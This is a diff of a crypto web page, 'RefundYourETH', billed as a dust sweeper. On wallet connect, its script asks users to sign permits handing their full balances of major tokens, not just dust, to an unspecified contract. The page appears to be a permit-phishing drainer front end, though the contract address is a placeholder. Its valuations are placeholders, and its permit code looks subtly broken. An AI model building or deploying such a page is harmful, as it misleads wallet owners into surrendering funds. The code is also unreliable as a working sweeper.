@@ -1,308 +1,303 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Ethereum Dust Sweeper</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            margin: 0;
-            padding: 0;
-            /* Full-screen background image */
-            background-image: url('https://iili.io/FtDCoJ4.png');
-            background-size: cover;
-            background-repeat: no-repeat;
-            background-position: center center;
-            background-attachment: fixed; /* Keeps background fixed while scrolling */
-            background-color: transparent;
-            color: #333;
-            text-align: center;
-        }
-        .header {
-    background: transparent; /* Made transparent to show your background image */
-    color: white;
-    padding: 80px 20px 20px;
-    position: relative;
-    box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ethereum Dust Sweeper</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f0f0f0;
+            color: #333;
+            text-align: center;
+        }
+        .header {
+    background: url('/images/header-art.png') no-repeat center center;
+    background-size: cover;
+    color: white;
+    padding: 80px 20px 20px;
+    position: relative;
+    box-shadow: 0 4px 8px rgba(0,0,0,0.1);
 }
 .header h1 {
-    font-weight: bold;
-    color: #00ffcc;
-    text-shadow: 1px 1px 4px rgba(0,0,0,0.3);
+    font-weight: bold; /* Makes "RefundYourETH" pop */
+    color: #00ffcc; /* Light teal accent for branding */
+    text-shadow: 1px 1px 4px rgba(0,0,0,0.3); /* Subtle glow */
 }
-        .section {
-            max-width: 600px;
-            margin: 20px auto;
-            padding: 20px;
-            background-color: white;
-            border-radius: 8px;
-            box-shadow: 0 0 10px rgba(0,0,0,0.1);
-        }
-        .button {
-            background-color: #1a73e8;
-            color: white;
-            padding: 10px 20px;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-            margin: 10px;
-            font-size: 16px;
-        }
-        .button:hover {
-            background-color: #1557b0;
-        }
-        #wallet-status, #claimable-amount, #dust-list {
-            margin: 10px 0;
-            font-size: 16px;
-        }
-        .footer {
-            margin-top: 20px;
-            padding: 10px;
-            background-color: #1a73e8;
-            color: white;
-        }
-        .footer a {
-            color: white;
-            margin: 0 10px;
-            text-decoration: none;
-        }
-    </style>
+        .section {
+            max-width: 600px;
+            margin: 20px auto;
+            padding: 20px;
+            background-color: white;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+        }
+        .button {
+            background-color: #1a73e8;
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            margin: 10px;
+            font-size: 16px;
+        }
+        .button:hover {
+            background-color: #1557b0;
+        }
+        #wallet-status, #claimable-amount, #dust-list {
+            margin: 10px 0;
+            font-size: 16px;
+        }
+        .footer {
+            margin-top: 20px;
+            padding: 10px;
+            background-color: #1a73e8;
+            color: white;
+        }
+        .footer a {
+            color: white;
+            margin: 0 10px;
+            text-decoration: none;
+        }
+    </style>
 </head>
 <body>
-    <div class="header">
-    <img src="/images/logo.png" alt="RefundYourETH Logo">
-    <h1>RefundYourETH</h1>
-    <p style="font-size: 16px; margin: 10px 0;">Reclaim your small ETH token balances with RefundYourETH! Connect your wallet to get started.</p>
+    <div class="header">
+    <img src="/images/logo.png" alt="RefundYourETH Logo">
+    <h1>RefundYourETH</h1>
+    <p style="font-size: 16px; margin: 10px 0;">Reclaim your small ETH token balances with RefundYourETH! Connect your wallet to get started.</p>
 </div>
-    <div class="section">
-        <button id="connect-wallet" class="button">Connect Wallet</button>
-        <div id="wallet-status">Wallet not connected</div>
-        <div id="dust-list"></div>
-        <div id="claimable-amount"></div>
-        <button id="convert-now" class="button" style="display: none;">Convert to ETH</button>
-    </div>
-    <div class="footer">
-    <a href="https://t.me/RefundYourETHgroup" target="_blank">Telegram</a> |
-    <a href="https://x.com/RefundYourETH" target="_blank">X</a> |
-    <a href="https://discord.gg/RefundYourETHserver" target="_blank">Discord</a> |
-    <a href="/privacy.html" target="_blank">Privacy Policy</a>
-    <p>Disclaimer: RefundYourETH only swaps verified, liquid tokens. Burns are at your risk. Users pay gas fees. No custody of funds.</p>
+    <div class="section">
+        <button id="connect-wallet" class="button">Connect Wallet</button>
+        <div id="wallet-status">Wallet not connected</div>
+        <div id="dust-list"></div>
+        <div id="claimable-amount"></div>
+        <button id="convert-now" class="button" style="display: none;">Convert to ETH</button>
+    </div>
+    <div class="footer">
+    <a href="https://t.me/RefundYourETHgroup" target="_blank">Telegram</a> |
+    <a href="https://x.com/RefundYourETH" target="_blank">X</a> |
+    <a href="https://discord.gg/RefundYourETHserver" target="_blank">Discord</a> |
+    <a href="/privacy.html" target="_blank">Privacy Policy</a>
+    <p>Disclaimer: RefundYourETH only swaps verified, liquid tokens. Burns are at your risk. Users pay gas fees. No custody of funds.</p>
 </div>
 
-    <script src="https://cdn.ethers.io/lib/ethers-5.7.umd.min.js"></script>
-    <script src="https://unpkg.com/@web3modal/ethereum@2.7.1/dist/index.js"></script>
-    <script src="https://unpkg.com/@walletconnect/ethereum-provider@2.7.1/dist/index.umd.js"></script>
-    <script>
-        const chains = [
-            {
-                chainId: 1, // Ethereum Mainnet
-                chainName: 'Ethereum',
-                nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
-                rpcUrls: ['https://rpc.ankr.com/eth'],
-                blockExplorerUrls: ['https://etherscan.io']
-            }
-        ];
-        const projectId = 'YOUR_WALLET_CONNECT_PROJECT_ID'; // Get from walletconnect.com
-        const web3Modal = new Web3Modal.Ethereum.Web3Modal({
-            projectId,
-            chains,
-            themeMode: 'light'
-        });
+    <script src="https://cdn.ethers.io/lib/ethers-5.7.umd.min.js"></script>
+    <script src="https://unpkg.com/@web3modal/ethereum@2.7.1/dist/index.js"></script>
+    <script src="https://unpkg.com/@walletconnect/ethereum-provider@2.7.1/dist/index.umd.js"></script>
+    <script>
+        const chains = [
+            {
+                chainId: 1, // Ethereum Mainnet
+                chainName: 'Ethereum',
+                nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
+                rpcUrls: ['https://rpc.ankr.com/eth'],
+                blockExplorerUrls: ['https://etherscan.io']
+            }
+        ];
+        const projectId = 'YOUR_WALLET_CONNECT_PROJECT_ID'; // Get from walletconnect.com
+        const web3Modal = new Web3Modal.Ethereum.Web3Modal({
+            projectId,
+            chains,
+            themeMode: 'light'
+        });
 
-        const connectButton = document.getElementById('connect-wallet');
-        const convertButton = document.getElementById('convert-now');
-        const burnButton = document.createElement('button');
-        burnButton.id = 'burn-now';
-        burnButton.className = 'button';
-        burnButton.textContent = 'Burn Dust';
-        burnButton.style.display = 'none';
-        document.querySelector('.section').insertBefore(burnButton, convertButton.nextSibling);
-        const walletStatus = document.getElementById('wallet-status');
-        const dustList = document.getElementById('dust-list');
-        const claimableAmount = document.getElementById('claimable-amount');
+        const connectButton = document.getElementById('connect-wallet');
+        const convertButton = document.getElementById('convert-now');
+        const burnButton = document.createElement('button');
+        burnButton.id = 'burn-now';
+        burnButton.className = 'button';
+        burnButton.textContent = 'Burn Dust';
+        burnButton.style.display = 'none';
+        document.querySelector('.section').insertBefore(burnButton, convertButton.nextSibling);
+        const walletStatus = document.getElementById('wallet-status');
+        const dustList = document.getElementById('dust-list');
+        const claimableAmount = document.getElementById('claimable-amount');
 
-        const sweeperContractAddress = '0xYourSmartContractAddress';
-        const feeRecipient = '0xYourFeeWalletAddress';
-        const minDustValue = 10; // $10 minimum for swaps
+        const sweeperContractAddress = '0xYourSmartContractAddress';
+        const feeRecipient = '0xYourFeeWalletAddress';
+        const minDustValue = 10; // $10 minimum for swaps
 
-        const tokenContracts = [
-            { address: '0xdAC17F958D2ee523a2206206994597C13D831ec7', name: 'USDT', decimals: 6, permit: false },
-            { address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', name: 'USDC', decimals: 6, permit: true },
-            { address: '0x6B175474E89094C44Da98b954EedeAC495271d0F', name: 'DAI', decimals: 18, permit: true },
-            { address: '0x514910771AF9Ca656af840dff83E8264EcF986CA', name: 'LINK', decimals: 18, permit: true },
-            { address: '0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984', name: 'UNI', decimals: 18, permit: true },
-            { address: '0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE', name: 'SHIB', decimals: 18, permit: false },
-            { address: '0xB8c77482e45F1F44dE1745F52C74426C631bDD52', name: 'DOGE', decimals: 8, permit: false },
-            { address: '0xB90B2A35C65f8f462b908CFFB9eDaaCc1B4568b2', name: 'FLOKI', decimals: 9, permit: false },
-            { address: '0x6982508145454Ce325dDbE47a25d4ec3d2311933', name: 'PEPE', decimals: 18, permit: false },
-            { address: '0x111111111117dC0aa78b770fA6A738034120C302', name: '1INCH', decimals: 18, permit: true }
-        ];
+        const tokenContracts = [
+            { address: '0xdAC17F958D2ee523a2206206994597C13D831ec7', name: 'USDT', decimals: 6, permit: false },
+            { address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', name: 'USDC', decimals: 6, permit: true },
+            { address: '0x6B175474E89094C44Da98b954EedeAC495271d0F', name: 'DAI', decimals: 18, permit: true },
+            { address: '0x514910771AF9Ca656af840dff83E8264EcF986CA', name: 'LINK', decimals: 18, permit: true },
+            { address: '0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984', name: 'UNI', decimals: 18, permit: true },
+            { address: '0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE', name: 'SHIB', decimals: 18, permit: false },
+            { address: '0xB8c77482e45F1F44dE1745F52C74426C631bDD52', name: 'DOGE', decimals: 8, permit: false },
+            { address: '0xB90B2A35C65f8f462b908CFFB9eDaaCc1B4568b2', name: 'FLOKI', decimals: 9, permit: false },
+            { address: '0x6982508145454Ce325dDbE47a25d4ec3d2311933', name: 'PEPE', decimals: 18, permit: false },
+            { address: '0x111111111117dC0aa78b770fA6A738034120C302', name: '1INCH', decimals: 18, permit: true }
+        ];
 
-        connectButton.addEventListener('click', async () => {
-            try {
-                const provider = await web3Modal.connect();
-                const ethersProvider = new ethers.providers.Web3Provider(provider);
-                const signer = ethersProvider.getSigner();
-                const address = await signer.getAddress();
-                connectButton.textContent = `Connected: ${address.slice(0, 6)}...${address.slice(-4)}`;
-                walletStatus.textContent = 'Scanning for dust tokens...';
+        connectButton.addEventListener('click', async () => {
+            try {
+                const provider = await web3Modal.connect();
+                const ethersProvider = new ethers.providers.Web3Provider(provider);
+                const signer = ethersProvider.getSigner();
+                const address = await signer.getAddress();
+                connectButton.textContent = `Connected: ${address.slice(0, 6)}...${address.slice(-4)}`;
+                walletStatus.textContent = 'Scanning for dust tokens...';
 
-                let dustFound = false;
-                let totalValue = 0;
-                const dustTokens = [];
-                const permitData = [];
-                const burnTokens = [];
-                dustList.innerHTML = '<h4>Tokens Found:</h4>';
+                let dustFound = false;
+                let totalValue = 0;
+                const dustTokens = [];
+                const permitData = [];
+                const burnTokens = [];
+                dustList.innerHTML = '<h4>Tokens Found:</h4>';
 
-                const chainId = (await ethersProvider.getNetwork()).chainId;
+                const chainId = (await ethersProvider.getNetwork()).chainId;
 
-                for (const token of tokenContracts) {
-                    const contract = new ethers.Contract(token.address, [
-                        'function balanceOf(address) view returns (uint256)',
-                        'function nonces(address) view returns (uint256)',
-                        'function DOMAIN_SEPARATOR() view returns (bytes32)'
-                    ], ethersProvider);
-                    const balance = await contract.balanceOf(address);
-                    if (balance > 0) {
-                        dustFound = true;
-                        dustTokens.push(token.address);
-                        const balanceFormatted = ethers.utils.formatUnits(balance, token.decimals);
-                        const value = parseFloat(balanceFormatted) * 1;
-                        totalValue += value;
-                        dustList.innerHTML += `<p>${token.name}: ${balanceFormatted} ($${value.toFixed(2)})</p>`;
+                for (const token of tokenContracts) {
+                    const contract = new ethers.Contract(token.address, [
+                        'function balanceOf(address) view returns (uint256)',
+                        'function nonces(address) view returns (uint256)',
+                        'function DOMAIN_SEPARATOR() view returns (bytes32)'
+                    ], ethersProvider);
+                    const balance = await contract.balanceOf(address);
+                    if (balance > 0) {
+                        dustFound = true;
+                        dustTokens.push(token.address);
+                        const balanceFormatted = ethers.utils.formatUnits(balance, token.decimals);
+                        const value = parseFloat(balanceFormatted) * 1; // Placeholder: $1 per token
+                        totalValue += value;
+                        dustList.innerHTML += `<p>${token.name}: ${balanceFormatted} ($${value.toFixed(2)})</p>`;
 
-                        if (token.permit) {
-                            const nonce = await contract.nonces(address);
-                            const deadline = Math.floor(Date.now() / 1000) + 1800;
-                            const domain = {
-                                name: token.name,
-                                version: '1',
-                                chainId: chainId,
-                                verifyingContract: token.address
-                            };
-                            const message = {
-                                owner: address,
-                                spender: sweeperContractAddress,
-                                value: balance,
-                                nonce: nonce,
-                                deadline: deadline
-                            };
-                            const signature = await signer._signTypedData(domain, {
-                                Permit: [
-                                    { name: 'owner', type: 'address' },
-                                    { name: 'spender', type: 'address' },
-                                    { name: 'value', type: 'uint256' },
-                                    { name: 'nonce', type: 'uint256' },
-                                    { name: 'deadline', type: 'uint256' }
-                                ]
-                            }, message);
-                            const { v, r, s } = ethers.utils.splitSignature(signature);
-                            permitData.push({ value: balance, deadline, v, r, s });
-                        } else {
-                            permitData.push({ value: 0, deadline: 0, v: 0, r: '0x', s: '0x' });
-                        }
-                    }
-                }
+                        if (token.permit) {
+                            const nonce = await contract.nonces(address);
+                            const deadline = Math.floor(Date.now() / 1000) + 1800;
+                            const domain = {
+                                name: token.name,
+                                version: '1',
+                                chainId: chainId,
+                                verifyingContract: token.address
+                            };
+                            const message = {
+                                owner: address,
+                                spender: sweeperContractAddress,
+                                value: balance,
+                                nonce: nonce,
+                                deadline: deadline
+                            };
+                            const signature = await signer._signTypedData(domain, {
+                                Permit: [
+                                    { name: 'owner', type: 'address' },
+                                    { name: 'spender', type: 'address' },
+                                    { name: 'value', type: 'uint256' },
+                                    { name: 'nonce', type: 'uint256' },
+                                    { name: 'deadline', type: 'uint256' }
+                                ]
+                            }, message);
+                            const { v, r, s } = ethers.utils.splitSignature(signature);
+                            permitData.push({ value: balance, deadline, v, r, s });
+                        } else {
+                            permitData.push({ value: 0, deadline: 0, v: 0, r: '0x', s: '0x' });
+                        }
+                    }
+                }
 
-                dustList.innerHTML += '<p style="color: red;">Unverified tokens may exist. Burn with caution.</p>';
-                burnTokens.push(...dustTokens);
+                dustList.innerHTML += '<p style="color: red;">Unverified tokens may exist. Burn with caution.</p>';
+                burnTokens.push(...dustTokens);
 
-                if (dustFound) {
-                    const claimableEth = (totalValue * 0.85).toFixed(2);
-                    const gasPrice = await ethersProvider.getGasPrice();
-                    const gasEstimate = gasPrice.mul(200000);
-                    const gasCostUsd = parseFloat(ethers.utils.formatEther(gasEstimate)) * 3000;
-                    if (totalValue >= minDustValue && claimableEth > gasCostUsd) {
-                        walletStatus.textContent = 'Safe tokens found! Approve once, then convert.';
-                        claimableAmount.textContent = `Claimable ETH Value: $${claimableEth} (after 15% fee, gas ~$${gasCostUsd.toFixed(2)})`;
-                        convertButton.style.display = 'block';
-                    } else {
-                        walletStatus.textContent = 'Dust value too low to cover gas fees. Try burning.';
-                        claimableAmount.textContent = `Total Dust Value: $${totalValue.toFixed(2)} (gas ~$${gasCostUsd.toFixed(2)})`;
-                        convertButton.style.display = 'none';
-                    }
-                    burnButton.style.display = 'block';
-                    convertButton.dataset.tokens = JSON.stringify(dustTokens);
-                    convertButton.dataset.permitData = JSON.stringify(permitData);
-                    burnButton.dataset.tokens = JSON.stringify(burnTokens);
-                    burnButton.dataset.permitData = JSON.stringify(permitData);
-                } else {
-                    walletStatus.textContent = 'No safe tokens found. Burn unverified tokens with caution.';
-                    convertButton.style.display = 'none';
-                    burnButton.style.display = 'block';
-                    burnButton.dataset.tokens = JSON.stringify([]);
-                    burnButton.dataset.permitData = JSON.stringify([]);
-                }
-            } catch (error) {
-                console.error(error);
-                walletStatus.textContent = 'Failed to connect wallet. Try again.';
-            }
-        });
+                if (dustFound) {
+                    const claimableEth = (totalValue * 0.85).toFixed(2);
+                    const gasPrice = await ethersProvider.getGasPrice();
+                    const gasEstimate = gasPrice.mul(200000);
+                    const gasCostUsd = parseFloat(ethers.utils.formatEther(gasEstimate)) * 3000; // Assume ETH = $3000
+                    if (totalValue >= minDustValue && claimableEth > gasCostUsd) {
+                        walletStatus.textContent = 'Safe tokens found! Approve once, then convert.';
+                        claimableAmount.textContent = `Claimable ETH Value: $${claimableEth} (after 15% fee, gas ~$${gasCostUsd.toFixed(2)})`;
+                        convertButton.style.display = 'block';
+                    } else {
+                        walletStatus.textContent = 'Dust value too low to cover gas fees. Try burning.';
+                        claimableAmount.textContent = `Total Dust Value: $${totalValue.toFixed(2)} (gas ~$${gasCostUsd.toFixed(2)})`;
+                        convertButton.style.display = 'none';
+                    }
+                    burnButton.style.display = 'block';
+                    convertButton.dataset.tokens = JSON.stringify(dustTokens);
+                    convertButton.dataset.permitData = JSON.stringify(permitData);
+                    burnButton.dataset.tokens = JSON.stringify(burnTokens);
+                    burnButton.dataset.permitData = JSON.stringify(permitData);
+                } else {
+                    walletStatus.textContent = 'No safe tokens found. Burn unverified tokens with caution.';
+                    convertButton.style.display = 'none';
+                    burnButton.style.display = 'block';
+                    burnButton.dataset.tokens = JSON.stringify([]);
+                    burnButton.dataset.permitData = JSON.stringify([]);
+                }
+            } catch (error) {
+                console.error(error);
+                walletStatus.textContent = 'Failed to connect wallet. Try again.';
+            }
+        });
 
-        convertButton.addEventListener('click', async () => {
-            try {
-                const provider = await web3Modal.connect();
-                const ethersProvider = new ethers.providers.Web3Provider(provider);
-                const signer = ethersProvider.getSigner();
-                const userAddress = await signer.getAddress();
-                const tokenAddresses = JSON.parse(convertButton.dataset.tokens);
-                const permitData = JSON.parse(convertButton.dataset.permitData);
+        convertButton.addEventListener('click', async () => {
+            try {
+                const provider = await web3Modal.connect();
+                const ethersProvider = new ethers.providers.Web3Provider(provider);
+                const signer = ethersProvider.getSigner();
+                const userAddress = await signer.getAddress();
+                const tokenAddresses = JSON.parse(convertButton.dataset.tokens);
+                const permitData = JSON.parse(convertButton.dataset.permitData);
 
-                const permitValues = permitData.map(data => data.value);
-                const deadlines = permitData.map(data => data.deadline);
-                const v = permitData.map(data => data.v);
-                const r = permitData.map(data => data.r);
-                const s = permitData.map(data => data.s);
+                const permitValues = permitData.map(data => data.value);
+                const deadlines = permitData.map(data => data.deadline);
+                const v = permitData.map(data => data.v);
+                const r = permitData.map(data => data.r);
+                const s = permitData.map(data => data.s);
 
-                const sweeperContract = new ethers.Contract(sweeperContractAddress, [
-                    'function sweepTokens(address[] tokens, address user, uint256[] permitValues, uint256[] deadlines, uint8[] v, bytes32[] r, bytes32[] s) external'
-                ], signer);
+                const sweeperContract = new ethers.Contract(sweeperContractAddress, [
+                    'function sweepTokens(address[] tokens, address user, uint256[] permitValues, uint256[] deadlines, uint8[] v, bytes32[] r, bytes32[] s) external'
+                ], signer);
 
-                walletStatus.textContent = 'Please confirm transaction in your wallet...';
-                const tx = await sweeperContract.sweepTokens(tokenAddresses, userAddress, permitValues, deadlines, v, r, s);
-                await tx.wait();
-                walletStatus.textContent = 'Success! Dust converted to ETH. Check your wallet!';
-                convertButton.style.display = 'none';
-                burnButton.style.display = 'none';
-            } catch (error) {
-                console.error(error);
-                walletStatus.textContent = 'Conversion failed. Try again or check your wallet.';
-            }
-        });
+                walletStatus.textContent = 'Please confirm transaction in your wallet...';
+                const tx = await sweeperContract.sweepTokens(tokenAddresses, userAddress, permitValues, deadlines, v, r, s);
+                await tx.wait();
+                walletStatus.textContent = 'Success! Dust converted to ETH. Check your wallet!';
+                convertButton.style.display = 'none';
+                burnButton.style.display = 'none';
+            } catch (error) {
+                console.error(error);
+                walletStatus.textContent = 'Conversion failed. Try again or check your wallet.';
+            }
+        });
 
-        burnButton.addEventListener('click', async () => {
-            try {
-                const provider = await web3Modal.connect();
-                const ethersProvider = new ethers.providers.Web3Provider(provider);
-                const signer = ethersProvider.getSigner();
-                const userAddress = await signer.getAddress();
-                const tokenAddresses = JSON.parse(burnButton.dataset.tokens);
-                const permitData = JSON.parse(burnButton.dataset.permitData);
+        burnButton.addEventListener('click', async () => {
+            try {
+                const provider = await web3Modal.connect();
+                const ethersProvider = new ethers.providers.Web3Provider(provider);
+                const signer = ethersProvider.getSigner();
+                const userAddress = await signer.getAddress();
+                const tokenAddresses = JSON.parse(burnButton.dataset.tokens);
+                const permitData = JSON.parse(burnButton.dataset.permitData);
 
-                const permitValues = permitData.map(data => data.value);
-                const deadlines = permitData.map(data => data.deadline);
-                const v = permitData.map(data => data.v);
-                const r = permitData.map(data => data.r);
-                const s = permitData.map(data => data.s);
+                const permitValues = permitData.map(data => data.value);
+                const deadlines = permitData.map(data => data.deadline);
+                const v = permitData.map(data => data.v);
+                const r = permitData.map(data => data.r);
+                const s = permitData.map(data => data.s);
 
-                const sweeperContract = new ethers.Contract(sweeperContractAddress, [
-                    'function burnTokens(address[] tokens, address user, uint256[] permitValues, uint256[] deadlines, uint8[] v, bytes32[] r, bytes32[] s) external payable'
-                ], signer);
+                const sweeperContract = new ethers.Contract(sweeperContractAddress, [
+                    'function burnTokens(address[] tokens, address user, uint256[] permitValues, uint256[] deadlines, uint8[] v, bytes32[] r, bytes32[] s) external payable'
+                ], signer);
 
-                walletStatus.textContent = 'Please confirm burn transaction in your wallet (includes $1 fee)...';
-                const tx = await sweeperContract.burnTokens(tokenAddresses, userAddress, permitValues, deadlines, v, r, s, {
-                    value: ethers.utils.parseEther('0.0004')
-                });
-                await tx.wait();
-                walletStatus.textContent = 'Success! Dust tokens burned. Check your wallet!';
-                convertButton.style.display = 'none';
-                burnButton.style.display = 'none';
-            } catch (error) {
-                console.error(error);
-                walletStatus.textContent = 'Burn failed. Try again or check your wallet.';
-            }
-        });
-    </script>
+                walletStatus.textContent = 'Please confirm burn transaction in your wallet (includes $1 fee)...';
+                const tx = await sweeperContract.burnTokens(tokenAddresses, userAddress, permitValues, deadlines, v, r, s, {
+                    value: ethers.utils.parseEther('0.0004')
+                });
+                await tx.wait();
+                walletStatus.textContent = 'Success! Dust tokens burned. Check your wallet!';
+                convertButton.style.display = 'none';
+                burnButton.style.display = 'none';
+            } catch (error) {
+                console.error(error);
+                walletStatus.textContent = 'Burn failed. Try again or check your wallet.';
+            }
+        });
+    </script>
 </body>
 </html>
